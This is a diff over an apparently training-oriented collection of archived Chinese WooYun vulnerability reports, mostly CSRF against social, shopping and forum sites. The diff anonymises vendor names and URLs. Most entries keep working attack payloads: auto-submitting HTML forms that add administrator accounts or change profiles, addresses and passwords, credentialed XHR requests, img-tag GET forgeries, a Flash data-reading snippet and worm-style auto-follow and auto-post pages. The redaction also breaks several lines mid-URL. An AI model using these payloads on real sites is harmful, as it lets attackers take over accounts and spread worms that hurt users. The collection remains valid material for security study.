+### [wooyun-2013-046515] 搜狐个人中心CSRF删除指定用户的某社交平台
 **厂商**: 搜狐 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
@@ -8441,7 +8441,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 搜狐个人中心删除微博功能为设计缺陷，可造成用户微博被删除。Ox1 . 删除个人微博的时候调用接口http://i.sohu.com/a/app/mblog/delete.htm?id={$id}0x2 . 当攻击者精心构造带有恶意攻击的链接便可造成用户微博被删除。用户点击后-------------------我是分割线-------------------上次提交的时候，wooyun没给通过，可能的却比较鸡肋吧，小菜确实不会挖厉害的漏洞。搜狐个人中心刷粉。0x1 '我的搜狐'跟随功能，会发送一个GET请求，格式如下： http://i.sohu.com/a/app/friend/friend/add.do?xpt=aXNtaWxlbnRAc29odS5jb20=&from_type=usercard&pageid=其中xpt为账户ismilent@sohu.com的base64编码。当访
+**详情**: 搜狐个人中心删除某社交平台功能为设计缺陷，可造成用户某社交平台被删除。Ox1 . 删除个人某社交平台的时候调用接口https://example.com/[已脱敏] . 当攻击者精心构造带有恶意攻击的链接便可造成用户某社交平台被删除。用户点击后-------------------我是分割线-------------------上次提交的时候，wooyun没给通过，可能的却比较鸡肋吧，小菜确实不会挖厉害的漏洞。搜狐个人中心刷粉。0x1 '我的搜狐'跟随功能，会发送一个GET请求，格式如下： https://example.com/[已脱敏]
 
 **POC**: 见详细。
 
@@ -8463,7 +8463,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上次配置星号，导致任意劫持漏洞：http://wooyun.org/bugs/wooyun-2010-0116229后来这样修复了。而且在我劫持过搜狐用户中心后，大部分上传点都进行了过滤，可是还是有漏掉的上传点：http://i.auto.sohu.com/user/userinfo/toModifyUserInfo.at#上传带有flash内容的jpg文件，抓包得到恶意图片地址：http://saa.auto.sohu.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/tmp/11682554/20150614172550.jpg嗯，这张图片所在域符合配置文件里的*.sohu.com那么哪些站点会受到影响呐？如下：http://my.tv.sohu.com/crossdomain.xml<cross-domain-polic
+**详情**: 上次配置星号，导致任意劫持漏洞：https://example.com/[已脱敏]
 
 **POC**: 如上~
 
@@ -8509,7 +8509,7 @@
 
 **详情**: 看crossdomain.xml<?xml version="1.0"?><cross-domain-policy> <site-control permitted-cross-domain-policies="all" /><allow-access-from domain="*" /><allow-http-request-headers-from domain="*" headers="*"/></cross-domain-policy>1：permitted-cross-domain-policies为all造成加载目标域上的任何文件作为跨域策略文件，甚至是一 个JPG也可被加载为策略文件！[使用此选项那就等着被xx吧！]2：allow-access-from 设为“*”任何的域，有权限通过flash读取本域中的内容。3：allow-http-request-headers-fro
 
-**POC**: 个人首页url：http://i.iqiyi.com/home?lefttitlesign=percenter获取用户用户个人首页信息：import flash.net.*;var mytest:String = "hello";var myloader = new URLLoader(new URLRequest("http://i.iqiyi.com/home?lefttitlesign=percenter"));myloader.addEventListener(Event.COMPLETE,test);myloader.load();function test(event:Event)
+**POC**: 个人首页url：https://example.com/[已脱敏] flash.net.*;var mytest:String = "hello";var myloader = new URLLoader(new URLRequest("https://example.com/[已脱敏]"));myloader.addEventListener(Event.COMPLETE,test);myloader.load();function test(event:Event)
 
 **绕过**: 直接利用
 
@@ -8539,8 +8539,8 @@
 ---
 
 ---
-### [wooyun-2013-043893] 腾讯MXDCSRF评论影响腾讯微博、空间
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-043893] 某互联网公司MXDCSRF评论影响某互联网公司某社交平台、空间
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -8553,7 +8553,7 @@
 
 **详情**: 
 
-**POC**: 访问：http://mxd.tencent.com/授权后访问http://1.wctest.sinaapp.com/html/txmxd.html即可
+**POC**: 访问：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -8597,7 +8597,7 @@
 
 **详情**: 一、首先我们进修改邮箱这个链接二、抓包，竟然没有token我们写个简单的表单好得接下来我们就让用户你打开表单。我就本地测试不放在服务器上了！我已经打开恶意的链接了，看截图
 
-**POC**: 用户名是zxcqianxiao邮箱是443开头的QQ邮箱再看我点击邮箱里的邮件整个漏洞过程就是这样
+**POC**: 用户名是zxcqianxiao邮箱是443开头的某互联网公司邮箱再看我点击邮箱里的邮件整个漏洞过程就是这样
 
 **绕过**: 直接利用
 
@@ -8617,7 +8617,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 一个链接刷关注。没有检测referer，也没有防csrfToken。加关注的数据包如下：POST /?action=friend_create&controller=ajax HTTP/1.1Host: i.club.sohu.comtp=baodabuping_sohu%40sohu.com&remark=&group_id=tp改为自己的搜狐用户id就行（不是昵称）一个链接就能加关注，CSRF利用示例链接如下：http://t.cn/RvG5w6B
+**详情**: 一个链接刷关注。没有检测referer，也没有防csrfToken。加关注的数据包如下：POST /?action=friend_create&controller=ajax HTTP/1.1Host: i.club.sohu.comtp=baodabuping_sohu%40sohu.com&remark=&group_id=tp改为自己的搜狐用户id就行（不是昵称）一个链接就能加关注，CSRF利用示例链接如下：https://example.com/[已脱敏]
 
 **POC**: 搜狐用户点击上述示例链接，就会自动对某账号加关注
 
@@ -8627,8 +8627,8 @@
 ---
 
 ---
-### [wooyun-2013-046101] 百度贴吧某功能CSRF漏洞callback参数问题
-**厂商**: 百度 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-046101] 某搜索引擎贴吧某功能CSRF漏洞callback参数问题
+**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 参数注入, 认证接口
 
@@ -8661,9 +8661,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 测试版本：x3.2，论坛需要开启广播功能（全局-->站点功能）。当访问一个url时，可取消收听指定用户http://127.0.0.1/dz/home.php?mod=spacecp&ac=follow&op=del&fuid=[用户id]没有token验证。
+**详情**: 测试版本：x3.2，论坛需要开启广播功能（全局-->站点功能）。当访问一个url时，可取消收听指定用户http://[IP已脱敏]
 
-**POC**: 收听一个用户，确定该用户的uid，比方说是1访问如下第三方也没就可取消啊收听<img src="http://127.0.0.1/dz/home.php?mod=spacecp&ac=follow&op=del&fuid=1"></img>
+**POC**: 收听一个用户，确定该用户的uid，比方说是1访问如下第三方也没就可取消啊收听<img src="http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -8685,7 +8685,7 @@
 
 **详情**: 请求：GET /cloud-web/integral/consume.htm?priId=1 HTTP/1.1响应：{"consume":0}
 
-**POC**: 弄个img，发get<img src="http://pan.suning.com/cloud-web/integral/consume.htm?priId=8">
+**POC**: 弄个img，发get<img src="https://example.com/[已脱敏]">
 
 **绕过**: 直接利用
 
@@ -8705,7 +8705,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 派代网主站设计缺陷可删除任意文章注册了2个号。在主站可以直接发文章。然后我抓了包http://www.paidai.com/managetopic.php?action=user_del_topic&boardid=47&topicid=202807&posterid=669387这是直接get操作 删除文章的。然后另外一个号 发一个文章。然后直接提交这个链接  文章就删除了http://www.paidai.com/managetopic.php?action=user_del_topic&boardid=45&topicid=202809&posterid=669387这个应该叫csrf 攻击吧。
+**详情**: 派代网主站设计缺陷可删除任意文章注册了2个号。在主站可以直接发文章。然后我抓了包https://example.com/[已脱敏] 删除文章的。然后另外一个号 发一个文章。然后直接提交这个链接  文章就删除了https://example.com/[已脱敏] 攻击吧。
 
 **POC**: 同上
 
@@ -8727,7 +8727,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 折800添加地址处没有token验证，导致crsf1、用户添加收货地址处：http://shop.zhe800.com/users/addresses2、点击添加后看到一个Post请求：3、没有token验证 写一个表单提交请求4、返回了地址了id号，添加成功
+**详情**: 折800添加地址处没有token验证，导致crsf1、用户添加收货地址处：https://example.com/[已脱敏] 写一个表单提交请求4、返回了地址了id号，添加成功
 
 **POC**: RT
 
@@ -8749,7 +8749,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: <html><body><form action="http://www.jollymm.com/members/address" method="POST"><input type="hidden" name="&#95;method" value="POST" /><input type="hidden" name="data&#91;Member&#93;&#91;consignee&#93;" value="1234" /><input type="hidden" name="data&#91;Member&#93;&#91;province&#93;" value="5" /><input type="hidden" name="data&#91;Member&#93;&#91;city&#93;" value="65" /><input type="hidden" name="
+**详情**: <html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="&#95;method" value="POST" /><input type="hidden" name="data&#91;Member&#93;&#91;consignee&#93;" value="1234" /><input type="hidden" name="data&#91;Member&#93;&#91;province&#93;" value="5" /><input type="hidden" name="data&#91;Member&#93;&#91;city&#93;" value="65" /><input type="hidden" name="
 
 **POC**: ~~
 
@@ -8771,7 +8771,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 进入个人信息，修改个人信息，抓包查看：可以看到无不可预测参数，可伪造csrf恶意链接，主要代码如下：xmlhttp.open("POST", "http://member.meishichina.com/mycenter/my_settings_profile/", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("sex=0&marry=1&birth=2015-9-2&birthyear=2015&birthmonth=9&birthday=2&blood=B&birthprovince=%E5%8C%97%E4%BA%AC&birthcity=%E4%B8%9C%E5%9F%8E&
+**详情**: 进入个人信息，修改个人信息，抓包查看：可以看到无不可预测参数，可伪造csrf恶意链接，主要代码如下：xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("sex=0&marry=1&birth=2015-9-2&birthyear=2015&birthmonth=9&birthday=2&blood=B&birthprovince=%E5%8C%97%E4%BA%AC&birthcity=%E4%B8%9C%E5%9F%8E&
 
 **POC**: 同上
 
@@ -8803,8 +8803,8 @@
 ---
 
 ---
-### [wooyun-2016-0180311] 新浪论坛CSRF打包及危害说明（多个子论坛通用）
-**厂商**: 新浪 | **年份**: 2016 | **类型**: CSRF
+### [wooyun-2016-0180311] 某社交平台论坛CSRF打包及危害说明（多个子论坛通用）
+**厂商**: 某社交平台 | **年份**: 2016 | **类型**: CSRF
 
 **元思考**: 触发信号: 参数注入
 
@@ -8815,9 +8815,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 此漏洞涉及到的新浪子论坛包括但不限于以下站点星座 http://club.astro.sina.com.cn/     b4201dfd数码 http://club.tech.sina.com.cn/      b4201dfd百味 http://club.news.sina.com.cn/      b4201dfd生活 http://club.life.sina.com.cn/      b4201dfd女性 http://club.eladies.sina.com.cn/   4788b761历史 http://club.history.sina.com.cn/   b4201dfd军事 http://club.mil.news.sina.com.cn/  b4201dfd体育 http://club.baby.sina.com.cn/      b4201dfd亲子 http://
+**详情**: 此漏洞涉及到的某社交平台子论坛包括但不限于以下站点星座 https://example.com/[已脱敏]     b4201dfd数码 https://example.com/[已脱敏]      b4201dfd百味 https://example.com/[已脱敏]      b4201dfd生活 https://example.com/[已脱敏]      b4201dfd女性 https://example.com/[已脱敏]   4788b761历史 https://example.com/[已脱敏]   b4201dfd军事 https://example.com/[已脱敏]  b4201dfd体育 https://example.com/[已脱敏]      b4201dfd亲子 http://
 
-**POC**: 以亲子论坛为例，时间有限只测试了四个位置，估计整个论坛都没有做csrf的防护，其他重要位置还请自行检测^_^1 修改用户信息<form action="http://club.baby.sina.com.cn/memcp.php?action=profile&typeid=2" method="post"><input type="hidden" name="formhash" value="aec0506d" /><input type="hidden" name="nicknamenew" value="GAY21888" /><input type="hidden" name="gend
+**POC**: 以亲子论坛为例，时间有限只测试了四个位置，估计整个论坛都没有做csrf的防护，其他重要位置还请自行检测^_^1 修改用户信息<form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="formhash" value="aec0506d" /><input type="hidden" name="nicknamenew" value="GAY21888" /><input type="hidden" name="gend
 
 **绕过**: 直接利用
 
@@ -8825,8 +8825,8 @@
 ---
 
 ---
-### [wooyun-2014-080964] 新浪微博某处小功能存在CSRF漏洞（可修改用户微博某元素）
-**厂商**: 新浪微博 | **年份**: 2014 | **类型**: CSRF
+### [wooyun-2014-080964] 某社交平台某社交平台某处小功能存在CSRF漏洞（可修改用户某社交平台某元素）
+**厂商**: 某社交平台某社交平台 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -8837,7 +8837,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 新版微博出了一个小功能（类似QQ空间一样），就是可以设置背景音乐。通过抓包后得知背景音乐某首歌的URL为：http://ting.weibo.com/music/weidanmobile/add?sid=2858931&gid=defaultid&key=f10aba96cdedec5df88cdaf6371d9ebf&token=5e04af60a57bc0b130ac9550f879b86e&plat=pc这里sid为这首歌的ID 后面token我理解为都是这首歌的。。直接点击上面的URL就可以看到在你个人页面左边有个背景音乐了：
+**详情**: 新版某社交平台出了一个小功能（类似某互联网公司空间一样），就是可以设置背景音乐。通过抓包后得知背景音乐某首歌的URL为：https://example.com/[已脱敏] 后面token我理解为都是这首歌的。。直接点击上面的URL就可以看到在你个人页面左边有个背景音乐了：
 
 **POC**: (见原文)
 
@@ -8847,8 +8847,8 @@
 ---
 
 ---
-### [wooyun-2013-035496] 百度贴吧某处csrf漏洞可自动关注贴吧（可刷贴吧会员数）
-**厂商**: 百度 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-035496] 某搜索引擎贴吧某处csrf漏洞可自动关注贴吧（可刷贴吧会员数）
+**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -8859,7 +8859,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://tieba.baidu.com/f?ie=utf-8&kw=贴吧名字&autolike=1用户只要访问该url就会自动关注kw里的贴吧
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -8869,8 +8869,8 @@
 ---
 
 ---
-### [wooyun-2013-026182] 腾讯微博csrf刷粉丝漏洞
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-026182] 某互联网公司某社交平台csrf刷粉丝漏洞
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -8881,7 +8881,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 腾讯微博的HK站点：http://t.hk.qq.com/1.发现这个站点数据会和"t.qq.com"站点同步，添加一个收听是GET请求，哈哈，so直接构造下面的请求；http://t.hk.qq.com/index.php/index/friend/follow/type/1/name/wooyun22.由于是GET请求，所以自己点击测试下就ok了；3.返回页面刷新，已经成功收听；
+**详情**: 某互联网公司某社交平台的HK站点：https://example.com/[已脱敏]"t.某互联网公司.com"站点同步，添加一个收听是GET请求，哈哈，so直接构造下面的请求；https://example.com/[已脱敏]
 
 **POC**: 见详细说明
 
@@ -8903,7 +8903,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 登录账户A，修改其收货地址，并抓包：查看其收货地址请求为post请求，同上不存在不可预测的参数，猜测存在csrf于是构造htmlxmlhttp.open("POST", "http://www.boqii.com/userinfo/User/editAddress", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("addrId=737093&name=woooo&province=13&city=1302&street=gktjgj&mobile=13200000000&phone=&zipCode=&isDefault=on")访问链接csrfboq.html刷新收货地址以看到收货
+**详情**: 登录账户A，修改其收货地址，并抓包：查看其收货地址请求为post请求，同上不存在不可预测的参数，猜测存在csrf于是构造htmlxmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("addrId=737093&name=woooo&province=13&city=1302&street=gktjgj&mobile=13200000000&phone=&zipCode=&isDefault=on")访问链接csrfboq.html刷新收货地址以看到收货
 
 **POC**: 同上
 
@@ -8925,7 +8925,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 嗯哼？在后台添加管理员时候开启burp截取下包看看是怎么样的。POST /phpmywind/admin/admin_save.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://127.0.0.1/phpmywind/admin/admin_add.phpCookie: 33b5b_lastpos=ot
+**详情**: 嗯哼？在后台添加管理员时候开启burp截取下包看看是怎么样的。POST /phpmywind/admin/admin_save.php HTTP/1.1Host: [IP已脱敏]User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://[IP已脱敏] 33b5b_lastpos=ot
 
 **POC**: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><title>OWASP CRSFTester Demonstration</title></head><body onload="javascript:fireForms()"><script language="JavaScript">var pauses = new Array( "62","47" );function pausecomp(millis){var date = new Date();var curDate = null;d
 
@@ -8947,9 +8947,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 此漏洞可以针对up主，关闭下列三项弹幕权限，使其发稿视频没有弹幕！csrf位置在用户中心-->过滤管理中，http://member.bilibili.com/#gl_manage
+**详情**: 此漏洞可以针对up主，关闭下列三项弹幕权限，使其发稿视频没有弹幕！csrf位置在用户中心-->过滤管理中，https://example.com/[已脱敏]
 
-**POC**: poc<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>CSRF/exploit--bilibili</title></head><body><form action="http://member.bilibili.com/video_manage.do?act=save_filter" method="POST"><input type="hidden" name="format" value="json" /><input type="hidden" name="a
+**POC**: poc<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>CSRF/exploit--bilibili</title></head><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="format" value="json" /><input type="hidden" name="a
 
 **绕过**: 直接利用
 
@@ -8979,7 +8979,7 @@
 ---
 
 ---
-### [wooyun-2013-040453] 搜狐微博某处csrf漏洞
+### [wooyun-2013-040453] 搜狐某社交平台某处csrf漏洞
 **厂商**: 搜狐 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
@@ -8991,7 +8991,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: post：http://i.sohu.com/a/app/mblog/save.htm?_input_encode=UTF-8cookie：[cookie]content=csrf
+**详情**: post：https://example.com/[已脱敏]]content=csrf
 
 **POC**: 如上
 
@@ -9001,8 +9001,8 @@
 ---
 
 ---
-### [wooyun-2012-05709] 网易微博CSRF漏洞--可造成蠕虫
-**厂商**: 网易 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-05709] 某互联网公司某社交平台CSRF漏洞--可造成蠕虫
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
 
@@ -9013,7 +9013,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: PS：貌似老早就被人发到wooyun上了，难道我穿越了…………1、登陆http://t.163.com2、访问http://50.19.159.231/163.html3、回到微博首页，自动发微博加关注
+**详情**: PS：貌似老早就被人发到wooyun上了，难道我穿越了…………1、登陆https://example.com/[已脱敏]
 
 **POC**: <html><head><title>163 weibo csrf test</title><script type="text/javascript">//follow mefunction addF(){document.getElementById("addF").submit();}//add twitterfunction addT(){document.getElementById("addT").submit();}</script></head><body onload="addF();addT();"><form target="addFF" id="addF" method
 
@@ -9023,8 +9023,8 @@
 ---
 
 ---
-### [wooyun-2013-020158] 腾讯微博惊现刷粉丝漏洞，微博控们有福了
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-020158] 某互联网公司某社交平台惊现刷粉丝漏洞，某社交平台控们有福了
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
 
@@ -9035,7 +9035,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 今天偶然发现腾讯出了个iweibo，好奇的看了下，于是有了下文！1）使用腾讯微博帐号登录，随便找了个未收听的人点击收听并抓包，一看我就笑了，直接就是GET；2）在iweibo上看了看，数据完全都是同t.qq.com上一致，也就是说两个站点数据是同步的；那么如果在iweibo上收听了某个人，是不是t.qq.com上也就会收听这个人，哈哈，这是可以刷粉丝了么？3）好吧，我是来自wooyun的白帽子，那就给wooyun刷点粉丝吧，将下列链接通过t.qq.com发布获取到短地址（达到更好隐藏的目的）；http://demo.i.t.qq.com/index.php/index/friend/follow/type/1/name/wooyun24）在iweobo页面刷新下我的广播，发现果然同步过来了；5）接下来找基友借了个干净的QQ号，未收听任何人；6）使用该帐号登录iweobo，找到我自己的微博-
+**详情**: 今天偶然发现某互联网公司出了个iweibo，好奇的看了下，于是有了下文！1）使用某互联网公司某社交平台帐号登录，随便找了个未收听的人点击收听并抓包，一看我就笑了，直接就是GET；2）在iweibo上看了看，数据完全都是同t.某互联网公司.com上一致，也就是说两个站点数据是同步的；那么如果在iweibo上收听了某个人，是不是t.某互联网公司.com上也就会收听这个人，哈哈，这是可以刷粉丝了么？3）好吧，我是来自wooyun的白帽子，那就给wooyun刷点粉丝吧，将下列链接通过t.某互联网公司.com发布获取到短地址（达到更好隐藏的目的）；https://example.com/[已脱敏]
 
 **POC**: 见详细说明
 
@@ -9059,7 +9059,7 @@
 
 **详情**: 版本:phpshe1.3最新版。其他版本没有测试，请自查后台管理列表，添加管理员表单没有token导致csrf
 
-**POC**: 不想录视频了。我提供代码你们自己测下。<form name="form1" action="http://127.0.0.1/cms/phpshe/admin.php?mod=admin&act=add" method="post"><input type="hidden" value="csrftest" name="info[admin_name]"></input><input type="hidden" value="csrftest" name="admin_pw"></input><input type="hidden"name="pesubmit" value="提 交" cla
+**POC**: 不想录视频了。我提供代码你们自己测下。<form name="form1" action="http://[IP已脱敏] method="post"><input type="hidden" value="csrftest" name="info[admin_name]"></input><input type="hidden" value="csrftest" name="admin_pw"></input><input type="hidden"name="pesubmit" value="提 交" cla
 
 **绕过**: 直接利用
 
@@ -9067,8 +9067,8 @@
 ---
 
 ---
-### [wooyun-2013-026768] 新浪微博某处csrf可构造蠕虫
-**厂商**: 新浪 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-026768] 某社交平台某社交平台某处csrf可构造蠕虫
+**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -9079,7 +9079,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.问题所在位置如下：2.写上内容点击发布并抓包得到数据；POST /event/emergencyRoom/send/process HTTP/1.1Host: tw.weibo.comUser-Agent:Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://tw.weibo.com/event/emergencyRoom/sendContent-Length: 61Cookie:Connection: keep-alivePragma: 
+**详情**: 1.问题所在位置如下：2.写上内容点击发布并抓包得到数据；POST /event/emergencyRoom/send/process HTTP/1.1Host: tw.weibo.comUser-Agent:Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: https://example.com/[已脱敏] 61Cookie:Connection: keep-alivePragma: 
 
 **POC**: 见详细说明
 
@@ -9101,9 +9101,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 花瓣网全站点多处功能设计缺陷导致跨站请求伪造(CSRF)#2(绕过X-CSRF-Token限制)。接口：http://huaban.com/password/reset/方式：POST提交数据：email:*****@qq.com（只需要提交一个没有注册过的邮箱地址即可。）返回{"err":403,"msg":"邮箱地址不存在","_csrf":"*****"}此处页面返回X-CSRF-Token，全站关于CSRF的防御将会因此全部无效。
+**详情**: 花瓣网全站点多处功能设计缺陷导致跨站请求伪造(CSRF)#2(绕过X-CSRF-Token限制)。接口：https://example.com/[已脱敏]"err":403,"msg":"邮箱地址不存在","_csrf":"*****"}此处页面返回X-CSRF-Token，全站关于CSRF的防御将会因此全部无效。
 
-**POC**: 顺便附带poc代码：<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>CSRF  POC</title></head><body><form action="http://huaban.com/password/reset/" method="post"><input type="hidden" name="email" value="*********@qq.com"/></form><script>document.forms[0].submit();</script>
+**POC**: 顺便附带poc代码：<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>CSRF  POC</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="email" value="*********@某互联网公司.com"/></form><script>document.forms[0].submit();</script>
 
 **绕过**: 过滤绕过
 
@@ -9123,7 +9123,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 一。文件位置：https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/model/ajax.class.phpfunction sava_ajaxresume_action(){$data['uid']=(int)$_POST['uid'];//邀请面试人的uid$data['title']='面试邀请';$data['content']=iconv("utf-8","gbk",$_POST['content']);//邀请内容$data['fid']=$this->uid;$data['datetime']=time();$info['content']=$data['content'];$info['jobname']=iconv("utf-8","gbk",$_POST['jobname']);//邀请面试的职位$info['use
+**详情**: 一。文件位置：https://example.com/[已脱敏] sava_ajaxresume_action(){$data['uid']=(int)$_POST['uid'];//邀请面试人的uid$data['title']='面试邀请';$data['content']=iconv("utf-8","gbk",$_POST['content']);//邀请内容$data['fid']=$this->uid;$data['datetime']=time();$info['content']=$data['content'];$info['jobname']=iconv("utf-8","gbk",$_POST['jobname']);//邀请面试的职位$info['use
 
 **POC**: 一。1.登录公司账户查看邀请面试的人才是0个目前公司积分19764分2.退出登录，自己构造包且在无用户登录状态3.提交包目前公司积分19752分，少12积分4.登录公司账号成功，你想去什么公司可以自己构造给自己发面试邀请啊二。1.post内容只需两个参数，关注人uid，被关注人id。这两个参数都是注册时自增的值。2.用户33未关注113.发post包。33关注11登录查看。已关注4.再次发   33取消关注11登录查看 。取消
 
@@ -9147,7 +9147,7 @@
 
 **详情**: 
 
-**POC**: 保存资料处没有任何验证。请求数据就不贴上了，构造的POC代码如下：<html><head><title>CSRF POC</title></head><body><form action="http://www.xinli001.com/user/option/" method="post"><input type="hidden" name="nickname" value="wooyunorg"><input type="hidden" name="gender" value="male"><input type="hidden" name="birthday" value="2014-2
+**POC**: 保存资料处没有任何验证。请求数据就不贴上了，构造的POC代码如下：<html><head><title>CSRF POC</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="nickname" value="wooyunorg"><input type="hidden" name="gender" value="male"><input type="hidden" name="birthday" value="2014-2
 
 **绕过**: 直接利用
 
@@ -9177,8 +9177,8 @@
 ---
 
 ---
-### [wooyun-2011-01447] QQ邮箱设置转发CSRF漏洞
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: CSRF
+### [wooyun-2011-01447] 某互联网公司邮箱设置转发CSRF漏洞
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -9213,7 +9213,7 @@
 
 **详情**: 
 
-**POC**: <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>CSRF  POC</title></head><body><form action="http://sex.guokr.com/setting/" method="post"><input type="hidden" name="nickname" value="&#x5C0F;&#x4E01;&#x4E01;&#x7206;&#x4E86;"/><!--这是utf-8编码，昵称处--><input type="hidde
+**POC**: <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>CSRF  POC</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="nickname" value="&#x5C0F;&#x4E01;&#x4E01;&#x7206;&#x4E86;"/><!--这是utf-8编码，昵称处--><input type="hidde
 
 **绕过**: 直接利用
 
@@ -9277,7 +9277,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 对于115网盘,上传的swf是可以被存在服务器上直接访问的,存储的域是staticdl.115.com,并且该地址是可以在未登陆下可访问的(这个倒是没什么安全问题,毕竟这个连接也是很长的,而且其他一些网盘也这么设计的)问题是my.115.com下的crossdomain.xml是这样的<allow-access-from domain="*.115.com"/>那么我们上传的文件是可以访问my.115.com下所有资源的..为了提高利用率,这里再说下圈子的flash的一个问题,flash视频在播放的时候并不是自动打开的,而是先有一个图片,点击后播放,但是脚本里对一些常见的网站是自动播放的..是这样放行的:"\\.(youku|56|ku6|kugou|tudou|sina|pptv|qiyi|qq|xiami|yinyuetai)\\.(com|cn|net)"我们只需在末尾加上.56.c
